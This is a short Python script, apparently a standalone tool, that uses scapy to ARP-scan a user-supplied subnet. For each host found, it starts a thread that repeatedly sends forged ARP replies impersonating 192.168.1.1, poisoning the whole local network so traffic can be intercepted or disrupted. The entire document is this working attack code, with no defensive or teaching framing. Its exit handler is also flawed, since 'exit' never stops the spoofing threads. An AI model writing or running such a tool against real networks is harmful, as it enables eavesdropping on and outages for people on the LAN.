from scapy.all import *
import scapy.all as scapy
from threading import Thread


working = True

def arp_spoof(targetIp, targetMac, spoofIp):
    while working:
        singlespoof(targetIp, targetMac, spoofIp)
        
def singlespoof(targetIp,targetMac, spoofIp):
    print("send to "+targetIp)
    packet = scapy.ARP(op = 2, pdst = targetIp, hwdst = targetMac, psrc = spoofIp)
    send(packet, verbose = False)
    time.sleep(4)
    
def waitForUserInputs():
    while working:
        string = input()
        if string == "exit":
            working = False

print("Enter the network to scan (xxx.xxx.xxx.xxx/xx)")
packet = Ether(dst="ff:ff:ff:ff:ff:ff")/scapy.ARP(pdst = input())
ans, unans = srp(packet, timeout=2)
print("Find "+str(len(ans))+" ip on the network")
threads = []
for target in ans:
    print("Start for "+target[1].psrc)
    thread = Thread(target=arp_spoof, args=[target[1].psrc,target[1].hwsrc, "192.168.1.1"])
    thread.start()
    threads.append(thread)

t = Thread(target=waitForUserInputs)
t.start()
threads.append(t)